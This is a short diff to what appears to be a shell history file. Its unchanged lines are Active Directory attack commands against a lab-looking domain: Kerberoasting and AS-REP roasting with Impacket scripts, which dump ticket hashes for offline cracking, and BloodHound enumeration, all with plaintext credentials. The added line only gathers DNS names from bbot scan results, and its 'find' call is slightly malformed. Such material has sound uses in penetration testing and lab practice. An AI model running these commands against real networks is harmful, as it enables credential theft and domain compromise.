@@ -42,3 +42,4 @@
 : 1670248307:0;python3 GetUserSPNs.py zach.local/zach:hunter2 -dc-ip 10.10.10.1 -request -outputfile roastme.txt
 : 1670248307:0;python3 GetNPUsers.py zach.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile asreproastme.txt
 : 1670248307:0;python3 bloodhound.py -c All -u admin -p 'Password!' -ns 192.168.1.1 -d zach.local -dc DC01.zach.local
+: 1670248307:0;find $HOME/.bbot/scans -type f -name "*.csv" exec cat {} + | grep DNS_NAME | cut -d',' -f2 | sort -u
